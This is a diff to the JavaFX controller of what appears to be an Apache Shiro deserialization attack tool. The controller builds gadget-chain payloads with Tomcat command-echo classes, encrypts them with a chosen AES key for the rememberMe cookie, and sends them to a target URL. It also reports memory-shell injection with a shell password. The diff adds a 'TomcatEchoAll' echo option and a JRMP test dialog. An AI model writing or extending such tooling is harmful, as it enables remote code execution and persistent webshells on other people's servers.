@@ -65,7 +65,7 @@ public class Controller {
     public Button execCmd;
 
     @FXML
-    public ChoiceBox checkType;
+    public ChoiceBox bruteType;
 
     @FXML
     public TextArea note;
@@ -149,12 +149,13 @@ public class Controller {
         method.setItems(methodData);
 
         ObservableList<String> checkTypeData = FXCollections.observableArrayList("SimplePrincipalCollection", "dnsLog.cn");
-        checkType.setValue("SimplePrincipalCollection");
-        checkType.setItems(checkTypeData);
+        bruteType.setValue("SimplePrincipalCollection");
+        bruteType.setItems(checkTypeData);
 
         ObservableList<String> echoTypeData = FXCollections.observableArrayList();
         echoTypeData.add("TomcatEcho");
         echoTypeData.add("TomcatEcho1");
+        echoTypeData.add("TomcatEchoAll");
         echoType.setValue("TomcatEcho");
         echoType.setItems(echoTypeData);
 
@@ -275,11 +276,9 @@ public class Controller {
                 Tools.alert("AES密钥错误", "请输入密钥");
                 return;
             }
-            paramsContext.put("oldKey", aesKey.getText());
-
+            paramsContext.put("Key", aesKey.getText());
             String gadgetName = gadget.getValue().toString();
             paramsContext.put("exp", gadget.getValue().toString());
-            String echo = echoType.getValue().toString();
             String url = paramsContext.get("url").toString();
             String method = paramsContext.get("method").toString();
             String rmeValue = paramsContext.get("rmeValue").toString();
@@ -288,16 +287,16 @@ public class Controller {
             //利用链
             Class clazz = Class.forName(Constants.PAYLOAD_PACK + gadgetName);
             //rce回显
-            Class clazz1 = Class.forName(Constants.PAYLOAD_PACK + echo);
+            Class clazz1 = Class.forName(Constants.PAYLOAD_PACK + echoType.getValue().toString());
             Method getPayloadMethod = clazz.getMethod("getPayload", byte[].class);
 
             byte[] payload = (byte[]) getPayloadMethod.invoke(null, clazz1.getMethod("getPayload").invoke(clazz1));
 
-            //System.out.println("payloadLen:"+payload.length);
+            System.out.println("payloadLen:"+payload.length);
 
             Map<String, Object> header = ShiroTool.getShiroHeader((Map<String, Object>) paramsContext.get("header"), rmeValue);
             String encryptData;
-            if (paramsContext.get("AES").equals(Constants.AES_GCM)) {
+            if (gcm.isSelected()) {
                 encryptData = PayloadEncryptTool.AesGcmEncrypt(payload, key);
             } else {
                 encryptData = PayloadEncryptTool.AesCbcEncrypt(payload, key);
@@ -325,6 +324,9 @@ public class Controller {
                     logUtil.printData(data.replace("$", ""));
                 } else {
                     logUtil.printWarningLog("未获取到回显! 可尝试更换回显或利用链", true);
+                    if (isShowPayload.isSelected()) {
+                        logUtil.printData(data);
+                    }
                 }
             }
 
@@ -421,9 +423,9 @@ public class Controller {
                 logUtil.printSucceedLog("shell密码:  "+passwd);
             }else {
                 logUtil.printAbortedLog("内存马注入失败！",true);
-                logUtil.printData(header1);
+                //logUtil.printData(header1);
                 //logUtil.printData(data);
-                logUtil.printData(ss);
+                //logUtil.printData(ss);
             }
         } catch (Exception e) {
             e.printStackTrace();
@@ -438,7 +440,7 @@ public class Controller {
     /**
      * 校验必填,设置config数据
      */
-    private void validAllDataAndSetConfig() {
+    public void validAllDataAndSetConfig() {
         //logUtil.printInfoLog("检测参数中。。。。。",true);
         String target = this.target.getText().trim();
         if (method.getValue().equals(Constants.METHOD_GET)) {
@@ -488,7 +490,7 @@ public class Controller {
 
         paramsContext.put("rmeValue", rmeValue);
         paramsContext.put("exp", gadget.getValue().toString());
-        paramsContext.put("checkType", checkType.getValue().toString());
+        paramsContext.put("bruteType", bruteType.getValue().toString());
         if (gcm.isSelected()) {
             paramsContext.put("AES", Constants.AES_GCM);
         } else {
@@ -757,6 +759,19 @@ public class Controller {
         //stage.setOpacity(1);
         stage.setTitle("短payload生成");
         stage.setScene(new Scene(root, 630, 410));
+        stage.setResizable(false);
+        stage.showAndWait();
+    }
+
+    public void jrmp(ActionEvent actionEvent) throws IOException {
+        ClassLoader classLoader = getClass().getClassLoader();
+        Parent root = FXMLLoader.load(classLoader.getResource("jrmp.fxml"));
+
+        Stage stage = new Stage();
+        stage.initModality(Modality.APPLICATION_MODAL);
+        stage.setOpacity(1);
+        stage.setTitle("jrmp测试");
+        stage.setScene(new Scene(root, 500, 80));
         stage.setResizable(false);
         stage.showAndWait();
     }
